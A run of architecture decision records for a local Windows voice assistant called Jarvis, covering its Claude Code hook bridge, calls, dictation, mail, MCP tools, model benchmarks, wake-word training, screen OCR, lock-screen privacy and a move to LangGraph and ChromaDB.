- **Decision:** `jarvis claude-hook` is a Claude Code command hook for `PreToolUse` (matcher `AskUserQuestion`), `PermissionRequest`, and `Notification`. It reads the event from stdin and posts it to the running Jarvis at `127.0.0.1:<port>/bridge` with a bearer token from `%LOCALAPPDATA%\Jarvis\bridge.json` (written by `jarvis serve`, removed when it stops); a request that carries an `Origin` header is refused, so no web page can use the route. Jarvis asks you by voice ("Claude in shop asks: which framework? one, React. two, Vue.") and on every open page at once. A question's answer is matched by number or name (fuzzy names need a clear margin), never by a model, and goes back as `updatedInput.answers` with `permissionDecision: "allow"`, the documented way to answer `AskUserQuestion` from a hook. A permission needs a clear spoken yes (allow) or no (deny); anything else, or no answer within `bridge.answer_timeout_s`, is no decision and Claude Code asks you as usual. Plans (`ExitPlanMode`) are never approved by ear. Notices ("Claude is waiting for you in shop") are spoken. `jarvis claude-hook install` adds the hooks to `~/.claude/settings.json`, keeping everything else and writing a backup.
- **Why:** you asked for Jarvis to bring you Claude's questions and options and pass your spoken choice back. Hooks are the supported way in (code.claude.com/docs/en/hooks), and keeping the model out of the answer path means a misheard answer can never become an approval.
- **Cost:** Jarvis must be running (`jarvis serve`, which starts at login). Whisper can mishear a name; numbers are the reliable answer. Only one question is asked at a time, and Claude's own prompt still appears if the hook gives no decision.

### ADR-052: Reaching your phone: ntfy pushes or Twilio calls, off by default

- **Decision:** `bridge.phone` is `""` (off), `"ntfy"`, or `"twilio"`. When the PC has not answered within `escalate_after_s`, the phone joins the race. ntfy: an urgent push (priority 5) with up to three answer buttons; a button posts a nonce to a reply topic that Jarvis polls. Permissions go over ntfy only when `NTFY_TOKEN` protects the topics, because anyone who knows a topic name can post to it. Twilio: a Studio flow call (`docs/twilio-ask-flow.json`) says the question and gathers a digit or speech; Jarvis polls the execution's context, so no public address or tunnel is needed.
- **Why:** you asked for Jarvis to call you. A real phone call needs a telephony provider (Twilio, paid); ntfy is free, open source, and self-hostable, and covers "ring my phone and let me tap an answer".
- **Cost:** the question text leaves this computer (to ntfy.sh or Twilio), so it stays off until you choose. Twilio costs money per call, and calls from a foreign number to Indian mobiles can be filtered by carriers (RISKS.md R35). Neither has been tried live: both need your accounts.

### ADR-053: Phone calls through Phone Link

- **Decision:** `call_contact(contact)` opens `tel:<number>` for a saved contact, and Windows hands it to Phone Link, which dials from your paired Android phone; you talk through the PC. The risk floor is `confirm`, like `send_whatsapp`: the confirmation names the contact and the last digits, the number always comes from the contact book, and a name that fits several people is asked about.
- **Why:** "call my mom" with no paid service. Phone Link is on this laptop (`Microsoft.YourPhone`), and `tel:` is how Windows routes calls to it.
- **Cost:** Phone Link must be paired with calls turned on (Bluetooth). Windows has not chosen an app for `tel:` links yet, so the first call asks which app to use. Not tried live: placing a real call needs you.

### ADR-054: Dictation into any app, with rules and no model

- **Decision:** holding `dictation.hotkey` (Ctrl+Alt+D) records like push-to-talk; on release Whisper transcribes without the command hint, and the text goes to the focused window, never to the agent. Rules, not a model, shape it: spoken "new line", "new paragraph", "comma", "full stop", "question mark", "exclamation mark", "semicolon", and a final "period" become punctuation, fillers ("um", "uh") are dropped, sentences start with a capital, and a trailing space follows end punctuation so the next dictation starts a new word. Up to `paste_over_chars` (200) characters are typed as Unicode keystrokes; longer text is pasted: the clipboard's text is saved, the dictation is put there with the formats that keep it out of Win+V history and the cloud clipboard, Ctrl+V is pressed, and the old text is put back after half a second. An image or files on the clipboard mean typing, because they could not be restored. Line breaks are Shift+Enter, so a "new line" in a chat box never sends the message. Jarvis waits for Ctrl, Alt, Shift, and Windows to be released first, so the text is not read as shortcuts, and refuses a window that runs as administrator (Windows would drop the input).
- **Why:** you chose typing for short text and pasting for long, and rules only. Typing is paced for slow apps (about 12 ms a character), which is fine for a sentence and too slow for a paragraph. Rules are instant and never change what you meant; a model could.
- **Cost:** pasting briefly replaces the clipboard, and an app that reads it more than half a second late would paste the old text. Some apps block pasting (a few password and banking fields), and dictation there is typed only when it is short. Whisper `small.en` mishears names and rare words; there is no correction step. Dictated text is not audited, because it is yours and never acted on.

### ADR-055: Media through Windows media sessions, with the media keys as a fallback

- **Decision:** `media_control(action)` (play, pause, toggle, next, previous) drives the session Windows considers current, through `GlobalSystemMediaTransportControlsSessionManager` (pywinrt, `winrt-windows-media-control`): play and pause are separate buttons, and the reply names the app. With no session, "pause" says nothing is playing and presses nothing; the other actions press the keyboard's media key, which is also the fallback when the API fails. `now_playing()` reads the title, artist, and app. `media_control` is public (its result never carries the title); `now_playing` is private, because what you listen to is yours.
- **Why:** you chose media sessions: they tell playing from paused and can say what is playing. Spotify, the Media Player, and YouTube in Brave and Chrome register sessions.
- **Cost:** one more pywinrt package (no system install). An app that registers no session gets only the toggle key, and Jarvis cannot tell what it did. When several apps play, Windows picks the current one.

### ADR-056: Exact short commands skip the model

- **Decision:** `core/fast_path.py` maps whole, exact phrases ("pause", "pause the music", "resume", "next song", "skip this song", "previous track", "what's playing", "what song is this") to a tool call, after removing the wake word, "please", and a trailing "now" or "Jarvis". The agent runs that call through the executor (policy gate, audit, events) and says its result; the exchange goes into the history like a model's own call, so the next turn sees it and the privacy flags count it. Bare "stop" keeps meaning stop Jarvis, and bare "next" or "previous" are not matched, because they mean other things.
- **Why:** you chose exact phrases. A media command answered in about 30 ms instead of 2 to 3 seconds; anything longer still reaches the model, so nothing is lost.
- **Cost:** a phrase list to maintain. The fast path never sees the conversation, so "pause it" always means the media.

### ADR-057: Mail over IMAP and SMTP with an app password; the calendar from its iCal link

- **Decision:** mail is read over IMAP (`imap.gmail.com`) and replies are sent over SMTP (`smtp.gmail.com`), signed in with your address (`[mail] address`, local.toml) and a Gmail app password (`MAIL_APP_PASSWORD` in `.env`), using only Python's standard library. The folder is opened read-only (EXAMINE) and messages are fetched with `BODY.PEEK`, so reading never marks, moves, or deletes anything. The calendar comes from its secret iCal address (`CALENDAR_ICS_URL` in `.env`, several allowed), downloaded at most every five minutes, kept in memory only, and expanded with `icalendar` and `recurring-ical-events` so repeating events land on the right days. `jarvis mail test` and `jarvis calendar test` check the setup and print counts only.
- **Why:** you chose it over Google's APIs: five minutes of setup, no Google Cloud project, no sign-in that expires every seven days, and it works the same with Outlook or Yahoo.
- **Cost:** an app password opens the whole mailbox, so it lives only in `.env`, never in the repository or the database; revoking it at myaccount.google.com/apppasswords cuts Jarvis off at once. The calendar is read-only (no "add a meeting"), and an iCal link shows changes with a delay of up to the server's refresh (Google's can lag by hours). Anyone with the secret link can read the calendar; Google can reset it.

### ADR-058: Emails: headers first, the text on request, replies after yes

- **Decision:** `read_mail(sender?, unread_only)` lists the newest emails (five by default) with sender, subject, and a 160-character preview; `read_email(message)` reads one email in full (up to `body_chars`, quoted history removed, secret-looking values hidden), found by its number in the last list, "the second one", a sender, or subject words. Both are private and untrusted. `reply_email(message, text, reply_all)` has the risk floor `confirm`: the confirmation shows every address and the exact text, the recipients always come from the email itself (Reply-To or the sender, plus the others on it for reply-all, never yourself), the model cannot name an address, and the approval is bound to the email and the text. Replies thread correctly (`In-Reply-To`, `References`, `Re:`). There is no tool for writing to new people.
- **Why:** you chose headers first and sending after a yes. Less email text in the context means fewer chances for a message to try prompt injection and faster answers; replying only on the thread means a misheard name can never send mail to a stranger.
- **Cost:** a summary of several emails needs one `read_email` each. An attacker who emails you controls its Reply-To, so the confirmation always reads the address out.

### ADR-059: An MCP client: listed tools only, asking first unless read-only on a trusted server

- **Decision:** `[mcp.servers.<name>]` describes a server: a `command` run over stdio (GitHub's server in Docker, an npx package) or a `url` over Streamable HTTP, with secrets written as `$NAME` and read from `.env`. A server whose secrets are missing is skipped. The official `mcp` Python SDK talks to it; each server lives in its own task (the SDK's transports need that), connected when `jarvis serve` starts or on the first command, and a server that fails is logged and left out without affecting anything else. Only the tools in its `tools` list become Jarvis tools, named `<server>_<tool>`; `jarvis mcp tools <server>` shows what a server offers, `jarvis mcp test <server>` what Jarvis exposes and how risky each is. The risk floor is `confirm`; a tool the server marks read-only (`readOnlyHint`) runs without asking only when the server is `trusted = true`; `risk` per tool and `safety.tool_risk_overrides` can raise a tool, never lower it. Results are private (unless the server says `sensitivity = "public"`) and always untrusted; a tool that reaches the outside world (MCP's default) is egress. MCP tools are offered to the model only when the request mentions the server's name or keywords, never as part of "all tools".
- **Why:** you chose asking first unless read-only and trusted, and only the tools you list. MCP is one integration point for GitHub, Home Assistant, databases, and calendars, and every tool still goes through the same policy gate and audit log as a built-in one.
- **Cost:** an MCP server is a program running on your laptop with the secrets you give it; a `trusted` server's labels are believed. A server's first start can be slow (Docker), and its tool descriptions are written for large models.

### ADR-060: GitHub through its official server in Docker, with trimmed schemas

- **Decision:** `[mcp.servers.github]` runs `ghcr.io/github/github-mcp-server:v2.0.2` (pinned) in Docker with `GITHUB_PERSONAL_ACCESS_TOKEN` from `.env` and the toolsets context, repos, issues, and pull requests. Ten of its 46 tools are listed: eight read-only (your profile, listing, reading, and searching issues, pull requests, repositories, commits), which run without asking because the server is marked trusted, and two that write (`issue_write`, `add_issue_comment`), which always ask. `[mcp.servers.github.params]` lists the parameters the model sees for each tool (required ones always stay), and every MCP schema is compacted (long descriptions cut to 100 characters, objects inside arrays collapsed, examples, defaults, and vendor keys dropped). `scripts/benchmark_tools.py --mcp` measures tool choice with the servers' real schemas; nothing is executed.
- **Why:** you chose GitHub first. Its untrimmed schemas were 19,000 characters for ten tools, which made a request take 6 to 17 seconds on the 8B model and one time out after 69 seconds; trimmed, they are 6,700 characters and all eight GitHub benchmark commands pick the right tool.
- **Cost:** Docker Desktop must be running. Parameters left out of `params` (paging, sorting, extra filters) cannot be used by voice until you add them. The model does not know your GitHub username: tell Jarvis "remember that my GitHub username is ...", or it may guess the owner of "my repo".

### ADR-061: Hermes 3 8B stays the default model

- **Decision:** after benchmarking the small models on the same commands with the same routing (84 commands, `docs/benchmarks/phase13.md`), Hermes 3 8B stays the default: 93% right at a median of 2.7 s. Llama 3.2 3B scored 87% at 0.4 s (fully on the GPU), and Qwen3 4B Instruct 2507 86% at 1.4 s (a third on the CPU at an 8K context). `config/ollama/qwen3-4b.Modelfile` is kept for anyone who wants to try it. The `qwen3:4b` tag itself is now the thinking-only release: neither Ollama's `think: false` nor `/no_think` stops it reasoning for hundreds of tokens before every answer, so it is unusable for voice.
- **Why:** your rule was to switch only for a model within 3 points of Hermes that is at least twice as fast and passes every safety scenario. Both small models are fast enough but 6 or more points behind: they confuse focus and open, guess which app "the app" means, and call speak for a greeting.
- **Cost:** a command still takes 2 to 4 seconds of model time. Llama 3.2 3B is one config line away (`[llm.providers.local] model = "llama3.2:3b"`) for someone who prefers speed.

### ADR-062: Whisper on the GPU, small.en kept

- **Decision:** `voice.stt_device` defaults to `"auto"`: with the `gpu` extra installed (`uv sync --extra gpu`, cuBLAS 12 and cuDNN 9 as pip packages, about 1 GB, no system install) Whisper runs on the GPU with `int8_float16`, otherwise on the CPU. Jarvis adds the packages' DLL folders to the search path, runs one real transcription when the model loads (only that loads cuBLAS), and falls back to the CPU if anything fails. The model stays `small.en`. `scripts/benchmark_stt.py` compares Whisper models, on synthetic speech or, with `--record` and `--mine`, on your own voice (kept in your data folder).
- **Why:** you asked to measure and switch only if accuracy holds. On 30 spoken commands, small.en on the GPU took 135 ms against 1.4 s on the CPU, with a word error rate of 6.8% against 11.2%. Hermes keeps the same share of the GPU with Whisper loaded (it uses 2.2 GB of the 4 GB; Whisper adds about 0.5 GB), and its warm replies stay at about 1.0 s. base.en was faster still on the CPU (0.44 s) and even scored better on Piper's voice, but synthetic speech flatters small models, and on the GPU the gain over small.en is only 80 ms.
- **Cost:** about 1 GB of CUDA libraries in the environment. A heavier model in Ollama, or another GPU app (a game), could leave too little GPU memory; then Whisper or the model moves to the CPU. Your voice may still favour base.en or medium.en: `--record` once, then `--mine`, tells.

### ADR-063: Semantic routing when no keyword matches

- **Decision:** when a request matches no keyword group (only question words, or nothing), `core/semantic_routing.py` embeds it with `nomic-embed-text` through Ollama and compares it with a few example requests per group, phrased without the group's keywords. Groups at or above `agent.semantic_threshold` (0.62), at most two and within 0.03 of the best, are offered; below it the old fallback applies. Keywords always win when they match, and MCP tools are still offered only by their own keywords. Example vectors are cached in the data folder; any failure (Ollama down, the model missing, slower than `semantic_timeout_s`) means no help, never an error. `jarvis serve` loads the embedding model at start.
- **Why:** you chose embeddings as a backup. Six paraphrases with no keywords ("what have I got lined up tomorrow", "it's too loud, bring it down", "has anybody tried to reach me") went from one right to six right, and Hermes's accuracy on all 84 commands from 86% to 93%; those requests also got faster, because the model no longer reads every tool. The threshold came from measuring: unrelated requests ("tell me a joke", "good morning") scored at most 0.60, paraphrases 0.64 to 0.83.
- **Cost:** about 90 ms per unmatched request once warm (the first takes about a second), and 0.3 GB of GPU memory, which fits beside Hermes and Whisper. The examples need adding to when a new group arrives.

### ADR-064: "Hey Jarvis" learns your voice with a custom verifier

- **Decision:** `jarvis voice --train-wake` records 8 clips of you saying "Hey Jarvis", 20 seconds of you reading a passage, and 5 seconds of the room, then trains openWakeWord's custom verifier (a logistic regression over the wake word model's own audio features) and saves it as `models\openwakeword\hey_jarvis-verifier.pkl` in your data folder, with the recordings in `wake-training`. Whenever the main model scores at least `voice.wake_verifier_floor` (0.1), the verifier's probability replaces the score, and `wake_threshold` (0.5) applies to that. Positive features are taken from moments the main model scores 0.05 or more, because openWakeWord's own training helper only uses moments at 0.5 or more, which is exactly what a voice that needs a verifier never reaches. `jarvis voice --wake-test` now ends with advice: train, or a stopgap threshold computed from your near misses. `wake_verifier = false` turns it off.
- **Why:** the first real test on this laptop scored every "Hey Jarvis" between 0.25 and 0.45 against a threshold of 0.5, so nothing ever woke Jarvis, while silence and other sound stayed at 0.00 to 0.10. The model was trained on synthetic voices; checked on this laptop, Piper's and Windows' voices score 1.0 even when muffled and pitch shifted, so it is real accents and microphones it misses. Lowering the threshold alone also lets similar sounds through; a verifier trained on your voice and your room separates them.
- **Cost:** two minutes of recording, and again if you move to a very different room or microphone. The verifier is a pickle file, which Python loads as code: Jarvis only ever loads the one it wrote itself, from your data folder. A verifier is trained on one voice, so other people will rarely wake Jarvis.

### ADR-065: Memories and past commands by meaning

- **Decision:** memories and past commands are embedded with `nomic-embed-text` (through Ollama, on this laptop) and the vectors kept in a new `embeddings` table, computed once per item and dropped when the item is deleted. Each turn, the memories that fit the request (similarity at least 0.51 and within 0.06 of the best, at most three) are repeated next to it for the model, across all memories rather than the newest 30, so up to 500 can be kept. `recall(about, when?)` searches the command history (what you said and what Jarvis answered) by meaning within a time range: today, yesterday, this or last week or month, a weekday, a date, "N days ago", or all time; it is private and untrusted, because an old answer may quote a page or a message. Without the embedding model both fall back to shared words.
- **Why:** you chose memories and past commands. Word matching missed "who is my boss" for "my manager is Ravi"; by meaning it scores 0.62 against at most 0.49 for unrelated requests (measured on this laptop with eight memories and thirteen questions).
- **Cost:** the first recall embeds the whole history once (about 20 seconds for a few hundred commands); later ones only the question. A request that needs reasoning ("can I eat this satay" for a peanut allergy) is not found by similarity; the memory is still in the prompt if it is among the newest 30.

### ADR-066: A morning briefing, offered once a day

- **Decision:** `briefing()` gathers weather for `weather.home`, today's calendar events, the reminders due today, the unread email count with up to three senders, and the new notifications with senders, each part with its own 20-second timeout and left out when it is not set up or fails. Email and messages are counts and senders only, never subjects or text. "Good morning", "brief me", and "how does my day look" run it without the model. The first command between 6 AM and noon each day ends with "By the way, would you like your morning briefing?"; a plain yes next plays it, anything else is an ordinary command, and nothing plays without your yes. `[briefing]` chooses the parts, the hours, and turns the offer off.
- **Why:** you chose weather, calendar and reminders, and unread email and messages, offered once a day. Counts and senders keep a briefing short when spoken and keep message text out of a room you may not be alone in.
- **Cost:** the offer adds one sentence to the first reply of the morning. Weather needs `weather.home` set; mail and calendar need their Phase 11 setup.

### ADR-067: Screen reading with Windows OCR

- **Decision:** `platform/ocr.py` captures a window (its DWM bounds) or every screen with mss and has Windows recognize the text through `Windows.Media.Ocr` (pywinrt, the language packs Windows already has; English here), with each word's position in physical pixels. `read_window_text` falls back to it by itself when UI Automation finds fewer than `ui.ocr_min_chars` (40) characters, bringing the window to the front first because whatever covers it is what gets read. `click` falls back to finding the text on screen when UI Automation has no such control: the confirmation always asks ("Click "Save draft" in ... (found by reading the screen)"), and after the yes Jarvis reads the window again and clicks only if the text is still there. `read_screen()` reads every screen for "what's on my screen". All of it is private and untrusted, with secret-looking values hidden; `ui.ocr_fallback = false` turns the fallbacks off.
- **Why:** you chose the automatic fallback, OCR clicks that always ask, and the window or the whole screen when asked. Windows OCR is already on the laptop, needs no model or download beyond small pip packages, and reads a window in about 0.4 seconds and the whole screen in about 0.3.
- **Cost:** reading a window this way brings it to the front. OCR mistakes small or stylized text ("12" came back as "1 2"), cannot read text covered by another window, and a click by position can land on something that moved; that is why OCR clicks always ask and look again first.

### ADR-068: A one-command installer, and release hygiene

- **Decision:** `install.ps1` (Windows PowerShell 5.1, no extra tools) checks Windows, uv, and Ollama; offers to install a missing uv or Ollama with winget, only after a yes (never in `-NonInteractive` or `-DryRun`); runs `uv sync` with the voice and Piper extras, plus `gpu` when an NVIDIA GPU is found; pulls the chosen model and `nomic-embed-text` and creates the model alias; creates `.env` and `config/local.toml` from their templates without ever overwriting them; downloads the speech models. Every step is skipped when already done, so it can be run again. `-DryRun` only reports, and CI runs it. The repository gains CHANGELOG.md (every phase as a version), issue and pull request templates (asking reporters to leave private content out), CODEOWNERS, Dependabot for GitHub Actions, and docs/RELEASING.md for merging the stacked phases and tagging after review. No release is published and no tag is pushed until the review.
- **Why:** these were the open-source polish steps recommended after Phase 15, and you asked for the next phase to follow the recommendations without asking. Eight manual setup commands became one, and a stranger's first report arrives with the version, the area, and no private data.
- **Cost:** the installer cannot be tested end to end on a clean machine in CI (no Ollama or GPU there), only its dry run; it was run for real on this laptop. Python dependencies are not under Dependabot because uv.lock updates deserve the full test suite and a human look.

### ADR-069: Calls through the WhatsApp desktop app

- **Decision:** `call_contact` opens the contact's chat in the WhatsApp desktop app and presses its Voice call button, after the usual yes. `[calls] method = "phone_link"` keeps the `tel:` way; neither falls back to the other. The link carries a one-time marker, and the button is pressed only after the marker is seen in the message box and cleared. Only a button named exactly "Voice call" can be pressed. `hang_up` presses WhatsApp's end call button.
- **Why:** you asked for WhatsApp calls. The app is already installed and signed in, with no pairing or call minutes. No documented link starts a call, so a button press is the way in. WhatsApp's chat header can show another name than the contact book, so names cannot prove the right chat is open, and a failed link leaves the previous chat open, whose button would ring the wrong person. The marker proves that this link opened the chat. Rows in the call history also say "Voice call", hence buttons only.
- **Cost:** only people on WhatsApp can be called. It extends the terms-of-service risk you accepted for messages (ADR-037, R5). See R52 for what can break.

### ADR-070: The wake effect is a native OpenGL window, not a web view

- **Decision:** a separate process (`jarvis.overlay`) draws a transparent, click-through, topmost window with GLFW and moderngl. It reads messages from a pipe and exits when the pipe closes. The page stays a web page.
- **Why:** a browser page cannot change the desktop, so the effect you asked for needs a window of its own. Both ways were measured on this laptop. WebView2 through pywebview stayed an opaque #202020 sheet, even with the DWM frame extended over it, and took 2.2 s to start. GLFW gave real per-pixel alpha, started in 0.19 s, and draws on the AMD GPU, leaving the RTX 3050's 4 GB for Hermes and Whisper. Electron would also work, at the cost of a Node runtime and a build step in a project that has neither.
- **A separate process** so a graphics driver crash cannot take voice down, and a pipe so nothing new listens on a socket and no private text crosses the network stack.
- **Cost:** two more dependencies (glfw, moderngl), and about 114 MB of memory for the process. Hidden, it uses 0% of the CPU and draws nothing; visible, about 21% of one core. See R53.

### ADR-071: What the overlay does

Yours, asked 2026-11-01, all as recommended.

- **Look:** a reactor core with plasma on the screen's edges. Cyan while listening, violet while thinking, gold while speaking, amber when a yes or no is needed.
- **Coverage:** the whole screen while you speak, then an edge glow and a small panel once Jarvis gets to work, so you can see what it does to your apps. `[overlay] mode = "edge"` keeps it small throughout.
- **Confirmations:** the overlay shows the exact question, and you answer by voice or with the page's card. It never takes a click or focus, so it cannot intercept a click meant for an app, and it cannot disturb the focus checks that WhatsApp sends and typing depend on (ADR-039 onward). A button on an always-on-top window would need a second, focusable window in the safety path.
- **Capture:** hidden from screenshots, screen shares, and Jarvis's own screen reading through WDA_EXCLUDEFROMCAPTURE. `[overlay] show_in_captures = true` is for recording a demo.
- **When it opens:** only for speech to Jarvis and for waiting on your answer. Typed commands, dictation, and spoken reminders never open it, and a fullscreen game or presentation keeps it hidden.

### ADR-072: Live transcripts while you speak

- **Decision:** during a recording Whisper also runs on what has been heard so far, at most every 0.8 s, and a slow run spaces the next one out to three times its length. The text is published as `TranscriptPartial`, for display only. The command that runs is still the final transcript, and "stop" and yes or no are matched only on it. `[voice] live_transcript = false` turns it off.
- **Why:** you asked to see your words as you say them, and Whisper on the GPU takes about 135 ms a pass. On the CPU (about 1.4 s) the spacing keeps it to one pass in about 4 s. Dictation stays out: that text belongs to the app it is typed into.
- **Cost:** the final transcript waits for a running partial, at most one pass. In the live test the text was ready 190 ms after the end of speech.

### ADR-073: The new page, and how tasteskill was used

- **Decision:** the page is rebuilt with the tasteskill app-screen rules (style `data-terminal`, seed 83454284): an icon rail, the reactor as the state indicator, the conversation as a transcript instead of chat bubbles, and flat panels with colour only on what something means. It is dark only. The page and the overlay share one shader, `static/reactor.glsl`.
- **Departures from the skill, on purpose:** its house rules ban glows, and you asked for the opposite, so all the light comes from the reactor canvas, which is a picture rather than styling on the controls. Its dealt font comes from Google Fonts, which would make a local-first app call out to the internet and break the page's Content-Security-Policy, so the page uses Bahnschrift from Windows. Its violet ban gives way to your chosen thinking colour. Its inspector still reports 0 FAIL at 1440, 768, and 390; its two warnings are monospace on tool names and arguments, which are literal code, and the empty conversation area.
- **Safety:** the canvas takes no clicks and dims only while you speak, never while a confirmation is waiting, so the Confirm card always stays readable. The existing security headers did not change.

### ADR-074: The microphone closes while the PC is locked

- **Decision (asked 2026-11-02, as recommended):** Jarvis asks Windows once a second whether the session is locked. While it is, the microphone is closed, so there is no wake word, push-to-talk, or dictation, and the state shows as microphone off. Unlocking brings voice back, unless you had turned the microphone off yourself. A recording in progress is dropped, and a question waiting for a spoken answer counts as no. There is no setting to turn this off.
- **Why:** a spoken yes approves calls and messages, and Jarvis does not know whose voice it is, so anyone near a locked PC could have used it (R55). The cost is unlocking before you can talk to Jarvis.
- **How:** `WTSQuerySessionInformationW` with `WTSSessionInfoEx`, which needs no window. If Windows cannot answer, voice stays as it was and one warning is logged, because turning voice off on an error could leave it off for good.
- **Not covered:** Jarvis can still speak while locked: a command already running finishes and says its answer, and reminders still sound.

### ADR-075: Past commands expire, and you can delete them by voice

- **Decision (2026-11-02, chosen without asking because you said to build everything now; easy to change):** commands, answers, their vectors, and finished reminders are deleted after 90 days, and the audit log after 365 (`[history] keep_days`, `audit_keep_days`; 0 keeps them forever). `forget_history` deletes by words or by time, always after a yes, and takes the audit rows of those turns too. The request itself is not kept, and the conversation is cleared, so "forget what I asked about my doctor" leaves no "doctor" behind. SQLite's `secure_delete` overwrites deleted text.
- **Why:** answers can quote private content (R50), and there was no way to remove them except deleting the whole database. The first start after this deletes anything already past those ages.
- **Words, not meaning:** recall finds by meaning, but a deletion should be easy to predict. Every word you name must appear in the command or its answer, and the question says how many and shows one.
- **Not covered:** `jarvis.db.corrupt-*` copies from an old recovery, Windows backups, and what a page already showing the conversation keeps until it reloads.

### ADR-076: Nothing private is said aloud while the PC is locked

- **Decision (2026-11-02, as recommended):** locking cuts off speech at once. A reminder or a Claude Code notice says only "I have something for you. Unlock the PC to hear it", and its words wait until you unlock (the newest 10). The answer to a command still running is not said; it is on the page and in the history. The `speak` tool refuses.
- **Why:** the microphone already closes (ADR-074), but Jarvis could still read a private reminder to whoever is in the room (R55).
- **The cost:** a timer on a locked PC tells you something is waiting, not which timer. There is no setting: a locked PC is the case this protects.
- **Not covered:** this lives in the voice session, so `jarvis chat` and a page with voice off do not know about the lock.

### ADR-077: Clipboard history is off by default and stays in memory

- **Decision (2026-11-02, chosen without asking because you said to build everything now):** `[clipboard] history = true` keeps the last 20 things you copy, in memory only. It is emptied when the PC locks and when Jarvis stops. It leaves out what looks like a secret, what is over 20,000 characters, and what the copying app marked as not for recording (the formats password managers and Jarvis's own dictation use). `clipboard_restore` puts one back privately, so it does not come back as a new copy, and you press Ctrl+V yourself.
- **Why off:** what you copy can be anything, including a password from an app that does not mark it. Windows' own Win+V history is a separate choice you already control. Nothing is written to disk, so a crash or the database file cannot give it away.
- **Why not Win+V's history:** its API is meant for the app in the foreground, and Jarvis rarely is. Not measured here.
- **Not covered:** while on, a password copied from an app that does not mark it sits in memory until the next lock, and if the model reads the list it enters the audit log, as `clipboard_read` always has. Only the first 200 characters of each are shown to the model.

### ADR-078: Focus sessions quiet Jarvis, not Windows

- **Decision (2026-11-02, chosen without asking):** "start a focus session for 50 minutes" (25 by default) holds Jarvis's reminders until the end. Timers still ring, commands still work, and the end says how long it was, how many messages came and from whom, and how many reminders waited. Reminders stay pending, so they survive a restart and then announce themselves as missed. The session itself is kept in the preferences.
- **Why not Do Not Disturb:** Windows has no supported API to turn it on. The known way writes to an undocumented store and can break with any update, so it is not done (R57). Turn it on yourself from the notification panel if you want other apps quiet too.
- **Not covered:** Claude Code's notices still speak during a session, because they are usually waiting on you.

### ADR-079: The agent loop moves to LangGraph and memory moves to ChromaDB

- **Decision (2026-11-05, your choice over the recommended "keep the current core"):** the agent loop becomes a LangGraph graph with the same steps ADR-003 already split it into (call model, gate, confirm, execute, respond), and memories and past commands move from SQLite vector rows to a ChromaDB persistent store in the data folder. Supersedes ADR-003. Embeddings still come from nomic-embed-text on Ollama and are handed to ChromaDB, so ChromaDB never downloads its own model and nothing leaves the laptop. SQLite keeps everything that is not a vector (audit, history text, preferences, contacts, reminders).
- **Why:** both are what people expect to see in an agent project, LangGraph gives checkpointing and a graph that can be drawn, and ChromaDB gives metadata filters and a real index instead of a full scan.
- **Cost:** a rewrite of tested code, heavier dependencies, and a one-time migration of the existing vectors. The policy gate, confirmation, and privacy guard stay outside the graph's control: they are nodes the graph must pass through, not prompts.
- **Done (Phase 24):** see ADR-083 and ADR-084.

### ADR-080: Screen understanding uses a local vision model

- **Decision (2026-11-05, your choice, recommended):** "what's on my screen" takes a screenshot and sends it to a small vision model on Ollama. The screenshot never leaves the laptop. Windows OCR (Phase 15) stays as the fast path for reading text.
- **Why:** screen content is private by the project rule, and only a local model keeps that rule.
- **Cost:** a model download of about 3 GB and a few seconds per answer on a 4 GB GPU; it competes with Hermes for video memory, so one of them is unloaded while the other runs.
- **Done (Phase 28):** see ADR-096.

### ADR-081: The web page and the overlay are removed; the server stays as an API

- **Decision (2026-11-05, your choice, recommended):** the HTML page, its shader, and the OpenGL wake overlay are deleted, along with the dependencies only they used. The localhost server stays as a small JSON and WebSocket API for the Claude Code bridge and for the UI that will be rebuilt from `ui-demos/`. Confirmations are answered in the CLI and by voice until then. Supersedes ADR-070 to ADR-073.
- **Why:** the UI will be redesigned from the demos, and the core should not carry a UI it is about to replace.
- **Cost:** no visual feedback on wake until the new UI exists.
- **Done in Phase 22:** with no page, the API refuses any request with an `Origin` header (every browser sends one), and the WebSocket token is published with the port in `bridge.json` for local clients. `glfw` and `moderngl` are gone. An old `[overlay]` section or `[server] open_browser` is ignored with a log line instead of failing the config. `--no-browser` stays as a hidden no-op so start-at-login shortcuts made before keep working.

### ADR-082: Plain sums skip the model

- **Decision (2026-11-05):** a request that is only arithmetic ("what's 10 + 10", "15 percent of 240", "9 squared") is turned into an expression and answered by `calculate` on the fast path (ADR-056), with no model call. The evaluator walks the syntax tree and allows only numbers, the four operations, powers (exponent up to 1000), modulo, and square roots; results over 1e100 or complex ones are refused. The model gets the same tool for wordy math.
- **Why:** an 8B model is slow at arithmetic and sometimes wrong; a sum should be instant and exact.
- **Cost:** spoken math has many phrasings; one the parser does not know still goes to the model, which then calls `calculate`, so it is slower but still right.

### ADR-083: The graph, the router pipeline, the guard, and clearances

- **Decision (2026-11-05, all as recommended):** the turn is a LangGraph graph of seven nodes (route, think, guard, gate, await_confirmation, execute, respond; ARCHITECTURE.md 4.1). Confirmation is a node that waits on the channel, not LangGraph's `interrupt()`, because a voice answer arrives on the same event loop within seconds and nothing has to survive a restart. The checkpointer is in memory, one thread per turn, deleted when the turn ends. Before the model, a router pipeline (`exact_phrase`, `arithmetic`, `template`, then `agent`; `[router] pipeline`) may propose a call, and every turn records the stage or model that handled it as `handled_by`. A guard repairs one near-miss call, never runs the same call twice in a turn, and caps calls per turn. A tool runs only with a one-time clearance the policy gate issues for exactly the approved arguments, and source scans in the tests keep every entry point behind the gate. No second model routes requests: the stages are code. Replies are spoken sentence by sentence while the local model writes them; if it speaks and then calls a tool, the stream closes at the call so nothing talks over a confirmation. LangSmith tracing is switched off inside the process. Secrets stay in .env.
- **Why:** the research (RESEARCH.md 6.2) showed every mature assistant answers obvious commands without a model and names its states; the graph makes the gate a node with no edge around it instead of a convention; clearances make skipping the gate fail loudly even from new code; streaming took Home Assistant's first audio from 5.31 s to 0.56 s.
- **Cost:** LangGraph adds about 2.5 s to import (warmed up in a thread at start), and a template match answers in the tool's own words, which are plainer than the model's. A turn that speaks and then calls a tool speaks its final answer only when the turn ends.

### ADR-084: Vectors in ChromaDB, two kinds of memory, written after the turn

- **Decision (2026-11-05, all as recommended):** vectors live in a ChromaDB persistent store in the data folder, one collection per kind (`memory`, `history`) and embedding model, telemetry off, with Jarvis handing it the nomic-embed-text vectors (no embedding function of its own). On first open the SQLite `embeddings` rows are copied in once; the table stays one release as the fallback, used when ChromaDB cannot open. Memories have a kind: `user` (facts about you) and `context` (the current work), each with its own character budget in the prompt (`[memory] user_chars`, `context_chars`). Vectors are written after the answer is out (`recall.after_turn`), never on the reply path.
